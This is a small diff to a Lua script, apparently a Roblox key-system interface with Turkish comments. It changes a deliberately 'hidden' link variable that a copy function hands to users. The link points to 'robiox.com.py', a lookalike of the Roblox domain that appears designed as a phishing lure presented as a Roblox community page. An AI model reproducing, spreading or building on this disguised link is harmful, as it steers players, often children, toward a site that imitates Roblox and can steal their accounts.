@@ -97,7 +97,7 @@ keyInput.ClearTextOnFocus = false
 keyInput.Parent = keyFrame
 
 -- Link (gizli, sadece değişkende)
-local myLink = "https://www.robiox.com.py/communities/383284659327/VEXHUBXGainfood"  -- <--- KENDİ LİNKİNİ YAZ
+local myLink = "https://www.robiox.com.py/communities/383284659327/VEXHUBXGainfood#!/about"  -- <--- KENDİ LİNKİNİ YAZ
 
 -- Kopyalama fonksiyonu (evrensel)
 local function copyLink()
